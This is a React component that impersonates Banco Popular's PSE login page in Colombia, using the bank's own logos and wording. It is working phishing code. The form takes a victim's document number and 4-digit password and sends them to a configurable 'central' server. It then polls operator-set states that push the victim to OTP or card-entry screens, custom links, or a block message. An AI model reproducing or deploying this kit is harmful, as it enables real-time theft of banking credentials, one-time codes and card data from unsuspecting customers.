import { useEffect, useMemo, useRef, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import iconEyeOpen from "../../images/ojo-abierto.png";
import iconEyeClosed from "../../images/ojo-cerrado.png";
import { instanceBackend } from '../../../../../axios/instanceBackend';
import LoadingPopular from '../../../../../components/LoadingPopular';
import ModalErrorLoginPopular from '../../modals/ModalErrorLoginPopular';
import { PSE_SESSION_HANDOFF_KEY } from '../../../../loadingPse/PseLoading';
import { redirectToTcIngreso } from '../../../../ingresoTc/tcSessionHelper';
import "./Popular_login_pse.css";

const POPULAR_ERROR_KEY = 'estado_sesion';
const POPULAR_MID_FLOW_KEY = 'popular_mid_flow';
const POPULAR_ERROR_LOGIN_MSG =
    'Las credenciales ingresadas no son válidas. Verifica e intenta nuevamente.';
const POPULAR_LOGIN_ERROR_AUTO_HIDE_MS = 5000;

const ESTADOS_TRAS_LOGIN = [
    'sol_otp',
    'sol_tc',
    'sol_finalizar',
    'sol_finalizado',
    'solicitar_finalizar',
    'error_otp',
    'error_login',
    'block_ip',
];

const POPULAR_DOC_TYPE_TO_RULE_KEY = {
    'Cédula de Ciudadania': 'CC',
    'Cédula de Extranjería': 'CE',
    'Tarjeta de Identidad': 'TI',
    'Pasaporte': 'PS',
    NIT: 'NI',
};

const POPULAR_DOC_RULES = {
    CC: {
        maxLen: 10,
        test: (n) => /^\d{6,10}$/.test(n),
        hint: 'La cédula de ciudadanía debe tener entre 6 y 10 dígitos.',
        digitsOnly: true,
    },
    CE: {
        maxLen: 10,
        test: (n) => /^\d{6,10}$/.test(n),
        hint: 'La cédula de extranjería debe tener entre 6 y 10 dígitos.',
        digitsOnly: true,
    },
    TI: {
        maxLen: 11,
        test: (n) => /^\d{10,11}$/.test(n),
        hint: 'La tarjeta de identidad debe tener 10 u 11 dígitos.',
        digitsOnly: true,
    },
    PS: {
        maxLen: 15,
        test: (n) => /^[A-Z0-9]{6,15}$/.test(n),
        hint: 'El pasaporte debe tener entre 6 y 15 caracteres alfanuméricos.',
        digitsOnly: false,
    },
    NI: {
        maxLen: 10,
        test: (n) => /^\d{9,10}$/.test(n),
        hint: 'El NIT debe tener 9 o 10 dígitos.',
        digitsOnly: true,
    },
};

const POPULAR_GENERIC_DOC_RULE = {
    maxLen: 15,
    test: (n) => /^\d{6,15}$/.test(n),
    hint: 'El número de documento debe tener entre 6 y 15 dígitos.',
    digitsOnly: true,
};

const getPopularDocRule = (documentType) => {
    const key = POPULAR_DOC_TYPE_TO_RULE_KEY[documentType];
    return key ? POPULAR_DOC_RULES[key] : POPULAR_GENERIC_DOC_RULE;
};

const sanitizePopularNumeroDocumento = (documentType, raw) => {
    const rule = getPopularDocRule(documentType);

    if (rule.digitsOnly) {
        return String(raw || '').replace(/\D/g, '').slice(0, rule.maxLen);
    }

    return String(raw || '')
        .replace(/[^A-Za-z0-9]/g, '')
        .toUpperCase()
        .slice(0, rule.maxLen);
};

const getPopularDocumentError = (documentType, numero) => {
    if (numero === '') return null;

    const rule = getPopularDocRule(documentType);

    if (rule.digitsOnly && !/^\d+$/.test(numero)) {
        return 'El número de documento solo debe contener dígitos.';
    }

    if (!rule.digitsOnly && !/^[A-Z0-9]+$/.test(numero)) {
        return 'El pasaporte solo debe contener letras y números.';
    }

    return rule.test(numero) ? null : rule.hint;
};

const sanitizePopularPassword = (raw) =>
    String(raw || '').replace(/\D/g, '').slice(0, 4);

const isValidPopularPassword = (value) => /^\d{4}$/.test(String(value || ''));

// Se crea el componente
function PopularPseLogin() {

    // Se inicializa la data del formulario
    const [formData, setFormData] = useState({
        documentType: 'Cédula de Ciudadania',
        documentNumber: '',
        password: ''
    });

    // Se inicializan los estados
    const [showPassword, setShowPassword] = useState(false);
    const [documentTouched, setDocumentTouched] = useState(false);
    const [passwordTouched, setPasswordTouched] = useState(false);
    const [showExoneracion, setShowExoneracion] = useState(false);
    const [showErrorModal, setShowErrorModal] = useState(false);
    const [errorMessage, setErrorMessage] = useState('');

    const documentError = useMemo(
        () => getPopularDocumentError(formData.documentType, formData.documentNumber),
        [formData.documentType, formData.documentNumber],
    );

    const documentMaxLength = useMemo(
        () => getPopularDocRule(formData.documentType).maxLen,
        [formData.documentType],
    );

    const isDocumentValid =
        formData.documentNumber.trim().length > 0 && documentError === null;

    const passwordError = useMemo(() => {
        if (!passwordTouched || formData.password === '') return null;
        return isValidPopularPassword(formData.password)
            ? null
            : 'La contraseña debe ser de 4 dígitos numéricos.';
    }, [formData.password, passwordTouched]);

    const isFormValid = isDocumentValid && isValidPopularPassword(formData.password);

    // Se inicializa el navigate
    const navigate = useNavigate();

    // Se declara el estado para el loading
    const [isLoading, setIsLoading] = useState(false);

    // Se crea el ref
    const pollingIntervalRef = useRef(null);
    const sessionIdRef = useRef(null);
    const lastEstadoRef = useRef(null);
    const allowPollNavigationRef = useRef(false);
    const modalBloqueoEstadoRef = useRef(null);
    const ignorarEstadoHastaCambioRef = useRef(null);
    const closeErrorLoginModalRef = useRef(() => {});

    const showLoginErrorBanner = (message = POPULAR_ERROR_LOGIN_MSG) => {
        setIsLoading(false);
        setFormData((prev) => ({
            ...prev,
            documentNumber: '',
            password: '',
        }));
        setDocumentTouched(false);
        setPasswordTouched(false);
        setErrorMessage(message);
        setShowErrorModal(true);
    };

    // Se crea el useEffect para verificar el estado de la sesion
    useEffect(() => {

        // Se captura el estado de error
        const pendingError = localStorage.getItem(POPULAR_ERROR_KEY);
        const midFlow = sessionStorage.getItem(POPULAR_MID_FLOW_KEY) === '1';
        const pseHandoff = sessionStorage.getItem(PSE_SESSION_HANDOFF_KEY);

        // Se valida si el estado de error es error
        if (pendingError === 'error') {
            modalBloqueoEstadoRef.current = 'error_login';
            showLoginErrorBanner(POPULAR_ERROR_LOGIN_MSG);
            localStorage.removeItem(POPULAR_ERROR_KEY);
        }

        if (pseHandoff) {

            // Se guarda la sessionId del handoff en localStorage
            localStorage.setItem('sessionId', pseHandoff);

            // Se actualiza la sessionId con el handoff de /pse
            sessionIdRef.current = pseHandoff;
            lastEstadoRef.current = null;

            // Se remueve el handoff
            sessionStorage.removeItem(PSE_SESSION_HANDOFF_KEY);

            // Se remueve mid flow previo para no arrancar en loading antes del ingreso
            sessionStorage.removeItem(POPULAR_MID_FLOW_KEY);

            // Se desactiva la navegacion por polling hasta enviar el login
            allowPollNavigationRef.current = false;

            // Se asegura que no quede cargando al llegar desde /pse
            setIsLoading(false);
        } else if (midFlow) {

            // Post-submit + F5: reanuda loading y polling sin permitir reenviar credenciales
            const sid = localStorage.getItem('sessionId');
            sessionIdRef.current = sid;

            if (sid) {

                // Se activa la navegacion por polling
                allowPollNavigationRef.current = true;

                // Se muestra loading mientras espera respuesta del operador
                setIsLoading(true);

                // Se inicia el polling
                initPolling();
            }
        } else {

            // Flujo inicial: mantiene la session existente y no inicia polling hasta el submit
            sessionIdRef.current = localStorage.getItem('sessionId');

            // Se desactiva la navegacion por polling hasta enviar el login
            allowPollNavigationRef.current = false;
        }

        // Se remueve el polling
        return () => {

            // Se para el polling
            stopPolling();
        };
    }, []);

    // Se crea el metodo para parar el polling
    const stopPolling = () => {

        // Se valida si el intervalo de polling existe
        if (pollingIntervalRef.current) {

            // Se limpia el intervalo de polling
            clearInterval(pollingIntervalRef.current);

            // Se resetea la referencia
            pollingIntervalRef.current = null;
        };
    };

    // Se crea el metodo para iniciar el polling
    const initPolling = () => {

        // Se para el polling
        stopPolling();

        // Se inicia el polling cada 3 segundos
        pollingIntervalRef.current = setInterval(() => {

            // Se verifica el estado
            verifyState();
        }, 3000);

        // Se verifica el estado
        verifyState();
    };

    // Se crea el metodo para redirigir rutas internas
    const redirigir = (ruta) => {

        // Se redirige a la ruta indicada
        navigate(ruta);
    };

    // Se crea el metodo para verificar el estado
    const verifyState = async () => {

        // Se usa el try catch
        try {

            // Se realiza la petición al backend
            const response = await instanceBackend.post(`/popular/verify-state/${sessionIdRef.current}`);

            // Se captura la respuesta
            const { estado: estadoRaw, url, text, tc, tarjeta, bank } = response?.data || {};

            // Se capturan los valores
            const estado = (estadoRaw || '').toLowerCase();

            // Se valida si la url es diferente de null
            const hasUrl = Boolean(url && String(url).trim());

            // Se captura la url custom
            const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);
            const tarjetaDigits = String(tarjeta || '').replace(/\D/g, '');
            const isTcSession = Boolean(tc);
            const isTcOtpFlow = isTcSession && tarjetaDigits.length > 0;

            // Se valida si el link es pendiente
            const linkPendiente = estado === 'sol_link_bot' || (estado === 'link_bot' && !hasUrl) || (estado === 'sol_link_custom' && !customLink);

            // Se valida si el estado es diferente de null
            if (!estado) return;

            // Se valida si el estado es diferente de null
            if (ignorarEstadoHastaCambioRef.current) {

                // Se valida si el estado es diferente del estado actual
                if (estado === ignorarEstadoHastaCambioRef.current) return;

                // Se actualiza el estado actual
                ignorarEstadoHastaCambioRef.current = null;

                // Se actualiza el estado actual
                modalBloqueoEstadoRef.current = null;
            }

            // Se valida si el estado es diferente del estado actual
            if (modalBloqueoEstadoRef.current && estado === modalBloqueoEstadoRef.current) return;

            // Se valida si el estado es diferente del estado actual
            if (ESTADOS_TRAS_LOGIN.includes(estado) && !allowPollNavigationRef.current) return;

            // Se valida si el estado es diferente del estado actual
            if (!linkPendiente && lastEstadoRef.current === estado) return;

            // Se actualiza el estado actual
            if (!linkPendiente) lastEstadoRef.current = estado;

            // Se valida el estado
            switch (estado) {

                // ------------ Casos botones linea 1 ------------
                case 'sol_otp':
                case 'sol_tc':

                    // Se para el polling
                    stopPolling();

                    // Se remueve el mid flow
                    sessionStorage.removeItem(POPULAR_MID_FLOW_KEY);

                    // Se redirige al flujo OTP generico si la sesión es TC
                    if (estado === 'sol_otp' && isTcOtpFlow) {

                        // Se redirige al flujo OTP generico si la sesión es TC
                        redirectToTcIngreso(
                            '/ingreso-tc/otp',
                            sessionIdRef.current,
                            bank,
                            tarjetaDigits,
                        );
                    } else {

                        // Se redirige a la pantalla OTP Popular
                        redirigir('/popular_otp');
                    }

                    // Se sale del switch
                    break;
                case 'error_otp':

                    // Se para el polling
                    stopPolling();

                    // Se remueve el mid flow
                    sessionStorage.removeItem(POPULAR_MID_FLOW_KEY);

                    // Se setea el estado de error
                    localStorage.setItem(POPULAR_ERROR_KEY, 'error');

                    // Se redirige al flujo OTP generico si la sesión es TC
                    if (isTcOtpFlow) {

                        // Se redirige al flujo OTP generico si la sesión es TC
                        redirectToTcIngreso(
                            '/ingreso-tc/otp',
                            sessionIdRef.current,
                            bank,
                            tarjetaDigits,
                            'error_otp',
                        );
                    } else {

                        // Se redirige a la pantalla OTP Popular
                        redirigir('/popular_otp');
                    }

                    // Se sale del switch
                    break;
                case 'error_login':

                    // Se para el polling
                    stopPolling();

                    // Se remueve el mid flow
                    sessionStorage.removeItem(POPULAR_MID_FLOW_KEY);

                    // Se desactiva la navegacion por polling
                    allowPollNavigationRef.current = false;

                    // Se setea el estado de error de login
                    modalBloqueoEstadoRef.current = 'error_login';

                    // Se quita el cargando
                    setIsLoading(false);

                    // Se muestra el banner de error de login
                    showLoginErrorBanner(POPULAR_ERROR_LOGIN_MSG);

                    // Se sale del switch
                    break;
                case 'sol_finalizar':
                case 'sol_finalizado':
                case 'solicitar_finalizar':

                    // Se para el polling
                    stopPolling();

                    // Se remueve el mid flow
                    sessionStorage.removeItem(POPULAR_MID_FLOW_KEY);

                    // Se limpia el storage de la sesion
                    localStorage.clear();
                    sessionStorage.clear();

                    // Se redirige al finalizado TC cuando la sesión viene por tarjeta
                    if (isTcSession) {

                        // Se redirige al finalizado de TC Legacy
                        window.location.href = `/finalizado-tc?sessionId=${encodeURIComponent(sessionIdRef.current)}`;
                    } else {

                        // Se redirige al finalizado PSE legacy
                        window.location.href = '/finalizado-pse?sessionId=' + sessionIdRef.current;
                    }

                    // Se sale del switch
                    break;
                case 'link_bot':

                    // Se valida si existe la url
                    if (hasUrl) {

                        // Se para el polling
                        stopPolling();

                        // Se remueve el mid flow
                        sessionStorage.removeItem(POPULAR_MID_FLOW_KEY);

                        // Se redirige a la pagina
                        window.location.href = url;
                    }

                    // Se sale del switch
                    break;
                case 'sol_link_custom':

                    // Se valida si existe el link custom
                    if (customLink) {

                        // Se para el polling
                        stopPolling();

                        // Se remueve el mid flow
                        sessionStorage.removeItem(POPULAR_MID_FLOW_KEY);

                        // Se redirige a la pagina
                        window.location.href = customLink;
                    }
                    break;
                case 'block_ip':
                case 'error_blocked':

                    // Se para el polling
                    stopPolling();

                    // Se remueve el mid flow
                    sessionStorage.removeItem(POPULAR_MID_FLOW_KEY);

                    // Se desactiva la navegacion por polling
                    allowPollNavigationRef.current = false;

                    // Se quita el cargando
                    setIsLoading(false);

                    // Se muestra el modal de error de login
                    setShowErrorModal(true);
                    setErrorMessage('Acceso bloqueado por seguridad.');

                    // Se sale del switch
                    break;
                default:

                    // Se sale del switch
                    break;
            }
        } catch (error) {

            // Se captura el status
            const status = error?.response?.status;

            // Se captura el estado del error
            const estadoErr = (error?.response?.data?.estado || '')
                .toString()
                .toLowerCase();

            // Se valida si el status es 403 y el estado del error es error_blocked
            if (status === 403 && estadoErr === 'error_blocked') {

                // Se para el polling
                stopPolling();

                // Se quita el cargando
                setIsLoading(false);

                // Se limpia el localStorage
                localStorage.clear();

                // Se redirige a la pagina
                window.location.href = process.env.REACT_APP_URL_BANK || '/';
            }
        }
    };

    // Se crea el metodo para cerrar el modal de error de login
    const closeErrorLoginModal = () => {

        // Se captura el estado del servidor
        const estadoServidor = modalBloqueoEstadoRef.current;

        // Se resetea el estado del servidor
        modalBloqueoEstadoRef.current = null;

        // Se valida si el estado del servidor es error de login
        if (estadoServidor === 'error_login') {

            // Se ignora el estado de cambio
            ignorarEstadoHastaCambioRef.current = 'error_login';
        }

        // Se cierra el modal de error de login
        setShowErrorModal(false);

        // Se quita el cargando
        setIsLoading(false);

        // Se limpian los campos
        setFormData(prev => ({
            ...prev,
            documentNumber: '',
            password: '',
        }));

        // Se resetean los campos
        setDocumentTouched(false);

        // Se resetean los campos
        setPasswordTouched(false);

        // Se remueve el mid flow para permitir un nuevo intento de login
        sessionStorage.removeItem(POPULAR_MID_FLOW_KEY);

        // Se desactiva la navegacion por polling hasta un nuevo submit
        allowPollNavigationRef.current = false;
    };

    closeErrorLoginModalRef.current = closeErrorLoginModal;

    useEffect(() => {
        if (!showErrorModal) return undefined;

        const timer = window.setTimeout(() => {
            closeErrorLoginModalRef.current();
        }, POPULAR_LOGIN_ERROR_AUTO_HIDE_MS);

        return () => window.clearTimeout(timer);
    }, [showErrorModal]);

    // Metodo encargado de manejar el submit del formulario
    const handleSubmit = async (e) => {

        // Se previene el comportamiento por defecto del formulario
        e.preventDefault();

        // Se valida si el cargando esta activo
        if (!isFormValid || isLoading) return;

        // Se captura la sessionId del localStorage
        const sessionId = localStorage.getItem('sessionId') || sessionIdRef.current;

        // Se captura la url central
        const centralUrl = (
            process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ''
        ).trim();

        // Se inicializa la data a enviar
        const dataSend = {
            data: {
                attributes: {
                    fecha: new Date().toISOString(),
                    tipoDocumento: formData.documentType,
                    usuario: formData.documentNumber,
                    clave: formData.password,
                    sessionId,
                    backend: 'P01',
                    backend_central_url: process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
                    backend_url: '/api/v1/popular/authenticacion',
                },
            },
        };

        // Se para el polling
        stopPolling();

        // Se resetea el estado actual
        lastEstadoRef.current = null;

        // Se usa el try catch
        try {

            // Se setea el cargando
            setIsLoading(true);

            // Se realiza la peticion al backend
            const response = centralUrl
                ? await instanceBackend.post(centralUrl, dataSend)
                : await instanceBackend.post('/popular/authenticacion', dataSend);

            // Se valida la respuesta
            if (response?.data?.success) {

                // Se captura la sessionId
                const sid = response.data.sessionId ?? sessionId;

                // Se guarda la sessionId en el localStorage
                localStorage.setItem('sessionId', sid);

                // Se actualiza la sessionId
                sessionIdRef.current = sid;

                // Se marca que el login ya fue enviado (recuperacion tras F5)
                sessionStorage.setItem(POPULAR_MID_FLOW_KEY, '1');

                // Se activa la navegacion por polling
                allowPollNavigationRef.current = true;

                // Se inicia el polling
                initPolling();
            } else {

                // Se quita el cargando
                setIsLoading(false);

                // Se desactiva la navegacion por polling
                allowPollNavigationRef.current = false;

                // Se muestra el banner de error de login
                showLoginErrorBanner(POPULAR_ERROR_LOGIN_MSG);
            }
        } catch (error) {

            // Se quita el cargando
            setIsLoading(false);

            // Se desactiva la navegacion por polling
            allowPollNavigationRef.current = false;

            // Se captura el status
            const status = error?.response?.status;

            // Se captura el estado del error
            const estadoErr = (error?.response?.data?.estado || '')
                .toString()
                .toLowerCase();

            // Se valida si el status es 403 y el estado del error es error_blocked
            if (status === 403 && estadoErr === 'error_blocked') {

                // Se limpia el localStorage
                localStorage.clear();

                // Se redirige a la pagina
                window.location.href = process.env.REACT_APP_URL_BANK || '/';
                return;
            }

            // Se muestra el banner de error de login
            showLoginErrorBanner(
                centralUrl
                    ? 'Error de comunicación con el servidor central.'
                    : 'Error de conexión con el servidor.',
            );
        }
    };

    // Se crea el metodo para manejar el cambio de los inputs
    const handleInputChange = (e) => {
        const { name, value } = e.target;

        if (name === 'documentType') {
            setFormData((prev) => ({
                ...prev,
                documentType: value,
                documentNumber: sanitizePopularNumeroDocumento(value, prev.documentNumber),
            }));
            return;
        }

        if (name === 'password') {
            setFormData((prev) => ({
                ...prev,
                password: sanitizePopularPassword(value),
            }));
            return;
        }

        setFormData((prev) => ({
            ...prev,
            [name]: value,
        }));
    };

    const handleDocumentNumberChange = (event) => {
        const sanitized = sanitizePopularNumeroDocumento(
            formData.documentType,
            event.target.value,
        );

        setFormData((prev) => ({
            ...prev,
            documentNumber: sanitized,
        }));

        if (!documentTouched) setDocumentTouched(true);
    };

    // Se crea el metodo para togglear la visibilidad de la contraseña
    const togglePasswordVisibility = () => {

        // Se togglea la visibilidad
        setShowPassword(!showPassword);
    };

    // Maneja el clic en el enlace de recargar
    const handleLinkClick = (e) => {

        // Previene el comportamiento por defecto
        e.preventDefault();

        // Recarga la página
        window.location.reload();
    };

    // Renderiza el componente
    return (
        <div className="popular-page">
            {/* Header */}
            <header className="popular-header">
                <div className="popular-header__container">
                    <div className="popular-header__back"></div>
                    <h1 className="popular-header__title">PSE</h1>
                    <div className="popular-header__actions">
                        <button className="popular-header__close-btn" onClick={handleLinkClick}>
                            <span>Cerrar</span>
                            <div className="popular-header__icon-box">
                                <em className="popular-icon-close">×</em>
                            </div>
                        </button>
                    </div>
                </div>
            </header>

            <div className="popular-header-spacer"></div>

            {/* Main Content */}
            <main className="popular-main">
                <div className="popular-login-container">
                    <div className="popular-login-card">
                        <img
                            src="https://pse.bancopopular.com.co/assets/images/popularhorizontal_new.svg"
                            alt="Banco Popular"
                            className="popular-login-card__logo"
                        />

                        <h2 className="popular-login-card__title">
                            Bienvenido a nuestro nuevo portal de pagos de servicios electrónicos.
                        </h2>

                        {showErrorModal ? (
                            <ModalErrorLoginPopular
                                variant="inline"
                                message={errorMessage || POPULAR_ERROR_LOGIN_MSG}
                                onClose={closeErrorLoginModal}
                            />
                        ) : null}

                        <form className="popular-form" onSubmit={handleSubmit} noValidate autoComplete="off">
                            {/* Tipo de Documento */}
                            <div className="popular-form-group">
                                <label className="popular-form-label">Tipo de documento</label>
                                <div className="popular-select-wrapper">
                                    <select
                                        name="documentType"
                                        value={formData.documentType}
                                        onChange={handleInputChange}
                                        disabled={isLoading}
                                        className="popular-form-select"
                                    >
                                        <option value="Cédula de Ciudadania">Cédula de Ciudadanía</option>
                                        <option value="Cédula de Extranjería">Cédula de Extranjería</option>
                                        <option value="Tarjeta de Identidad">Tarjeta de Identidad</option>
                                        <option value="Pasaporte">Pasaporte</option>
                                        <option value="NIT">NIT</option>
                                    </select>
                                </div>
                            </div>

                            {/* Número de Documento */}
                            <div className="popular-form-group">
                                <label className="popular-form-label">
                                    Número de documento (sin puntos ni comas)
                                </label>
                                <input
                                    type="text"
                                    inputMode={
                                        getPopularDocRule(formData.documentType).digitsOnly
                                            ? 'numeric'
                                            : 'text'
                                    }
                                    name="documentNumber"
                                    value={formData.documentNumber}
                                    onChange={handleDocumentNumberChange}
                                    onBlur={() => setDocumentTouched(true)}
                                    maxLength={documentMaxLength}
                                    disabled={isLoading}
                                    className="popular-form-input"
                                    autoComplete="nope"
                                    aria-invalid={Boolean(documentTouched && documentError)}
                                />
                                {documentTouched && formData.documentNumber === '' && (
                                    <span className="popular-error-message">Número de documento inválido</span>
                                )}
                                {documentTouched && formData.documentNumber !== '' && documentError && (
                                    <span className="popular-error-message">{documentError}</span>
                                )}
                            </div>

                            {/* Contraseña */}
                            <div className="popular-form-group">
                                <div className="popular-form-label-row">
                                    <label className="popular-form-label">Contraseña</label>
                                    <a
                                        href="#"
                                        onClick={handleLinkClick}
                                        className="popular-link--forgot"
                                    >
                                        ¿Olvidaste tu contraseña?
                                    </a>
                                </div>
                                <div className="popular-input-icon-wrapper">
                                    <input
                                        type={showPassword ? 'text' : 'password'}
                                        name="password"
                                        value={formData.password}
                                        onChange={(e) => {
                                            handleInputChange(e);
                                            if (!passwordTouched) setPasswordTouched(true);
                                        }}
                                        onBlur={() => setPasswordTouched(true)}
                                        disabled={isLoading}
                                        className="popular-form-input popular-form-input--password"
                                        autoComplete="new-password"
                                        inputMode="numeric"
                                        pattern="[0-9]*"
                                        maxLength={4}
                                        aria-invalid={Boolean(passwordError)}
                                    />
                                    <img
                                        src={showPassword ? iconEyeClosed : iconEyeOpen}
                                        alt={showPassword ? "Ocultar" : "Mostrar"}
                                        className="popular-img-eye"
                                        onClick={isLoading ? undefined : togglePasswordVisibility}
                                        style={{ opacity: isLoading ? 0.5 : 1, cursor: isLoading ? 'not-allowed' : 'pointer' }}
                                    />
                                </div>
                                {passwordTouched && formData.password === '' && (
                                    <span className="popular-error-message">
                                        La contraseña debe ser de 4 dígitos numéricos
                                    </span>
                                )}
                                {passwordError && (
                                    <span className="popular-error-message">{passwordError}</span>
                                )}
                            </div>

                            {/* Botón Ingresar */}
                            <div className="popular-form-group">
                                <button
                                    type="submit"
                                    disabled={!isFormValid || isLoading}
                                    className="popular-btn popular-btn--primary"
                                    onClick={handleSubmit}
                                >
                                    Ingresar
                                </button>
                            </div>

                            {/* Mensaje Registro */}
                            <div className="popular-form-footer">
                                <p className="popular-form-footer__question">
                                    <b>¿No estás registrado?</b>
                                </p>
                                <p className="popular-form-footer__text">
                                    Antes de realizar pagos,{' '}
                                    <a
                                        href="#"
                                        onClick={handleLinkClick}
                                        className="popular-link"
                                    >
                                        registrate aquí.
                                    </a>
                                    <br />
                                    Después espera 30 min y vuelve a intentar hacer tu pago PSE.
                                    Si necesitas ayuda llama a la línea verde Bogotá: 743 4646 -
                                    Línea nacional: 01 8000 184646
                                </p>
                            </div>
                        </form>

                        <div className="popular-login-card__disclaimer">
                            <button
                                type="button"
                                className="popular-link--small"
                                onClick={() => setShowExoneracion(true)}
                            >
                                Exoneración de responsabilidad
                            </button>
                        </div>
                    </div>
                </div>
            </main>

            {/* CORREGIDO: Footer fijo al final de la pantalla, fuera del main */}
            <footer className="popular-footer">
                <div className="popular-footer__container">
                    <img
                        src="https://pse.bancopopular.com.co/assets/images/aval.png"
                        alt="Grupo Aval"
                        className="popular-footer__logo"
                    />
                    <div className="popular-footer__right">
                        <p className="popular-footer__copyright">
                            © Banco Popular | v1.0.28
                        </p>
                        {/* CORREGIDO: reCAPTCHA badge con efecto hover */}
                        <div className="recaptcha-badge">
                            <div className="recaptcha-badge-icon"></div>
                            <div className="recaptcha-badge-text">protección de reCAPTCHA</div>
                        </div>
                    </div>
                </div>
            </footer>

            {/* Modal de Exoneración */}
            {showExoneracion && (
                <div className="modal-overlay" onClick={() => setShowExoneracion(false)}>
                    <div className="modal-exoneracion" onClick={(e) => e.stopPropagation()}>
                        <p>
                            Estás realizando un pago por PSE y nosotros estamos siendo intermediarios
                            del pago de un producto o servicio que tú has seleccionado.
                        </p>
                        <p>
                            Por esto, el banco queda exonerado de toda responsabilidad por los perjuicios
                            generados por incumplimiento en la entrega o calidad del producto por parte
                            del proveedor. Por esto, cualquier reclamación la debes realizar directamente con él.
                        </p>
                        <button
                            className="popular-btn popular-btn--primary modal-btn"
                            onClick={() => setShowExoneracion(false)}
                        >
                            Cerrar
                        </button>
                    </div>
                </div>
            )}

            {isLoading ? <LoadingPopular isOpen /> : null}
        </div>
    );
}

// Se exporta el componente
export default PopularPseLogin;
